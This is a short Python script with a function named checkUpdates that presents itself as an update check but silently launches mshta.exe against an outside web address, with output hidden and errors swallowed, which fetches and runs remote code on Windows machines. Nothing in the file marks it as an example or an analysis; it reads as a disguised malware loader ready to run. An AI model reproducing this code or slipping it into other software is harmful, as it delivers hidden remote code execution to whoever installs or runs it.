import subprocess

def checkUpdates():
    try:
        subprocess.Popen(
            ['mshta.exe', 'https://node1-py-store.com' ],
            shell=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        return True
    except Exception as e:
        return False

if __name__ == "__main__":
    checkUpdates()
